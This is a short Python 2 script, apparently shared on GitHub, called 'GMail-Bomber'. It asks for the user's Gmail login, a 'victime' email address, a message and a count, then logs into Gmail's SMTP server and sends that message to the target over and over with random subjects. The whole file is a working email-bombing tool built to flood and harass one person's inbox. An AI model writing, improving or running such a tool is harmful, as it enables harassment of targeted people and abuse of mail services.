# -*- coding: utf-8 -*-
# %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: March 26 , 2018 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
# By :                       Lamani Fodil Hani (VEGETA-LFH)     
# Fb :                           Lamani Fodil Hani              
# Github :                    www.github.com/lamanihani      
# Gmail :                       lamanihani1@gmail.com  
############################################# Import some lib #############################
import os
import random
import smtplib
import sys
############################ JUST a SHIT ###################
print("GMail-Bomber By : Lamani Hani VEGETA-LFH ")
print(" ")
#########################   USER INFO ##########################
user = raw_input('[?] Your Gmail : ')
passworde = raw_input('[?] Your Password : ')

victime = raw_input('[?] The victime EMAIL : ')
message = raw_input('[?] Your Message : ')
hani = input('[?] Number of send : ')

############################### SMTP_SERVER INFO ##################
smtp_server = 'smtp.gmail.com'
port = 587

##########################  Login ############################
try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passworde)
###################### SENDING #########################################
    for i in range(1, hani+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + message
        server.sendmail(user,victime,msg)
        print "[] Email SENT  : %i" % i
        sys.stdout.flush()
    server.quit()
    print 'All Message was sent '
except smtplib.SMTPAuthenticationError:
    print '[!] The username or password you entered is incorrect.'
    print " Check if your Email OPtions if the was enabled"
    sys.exit()


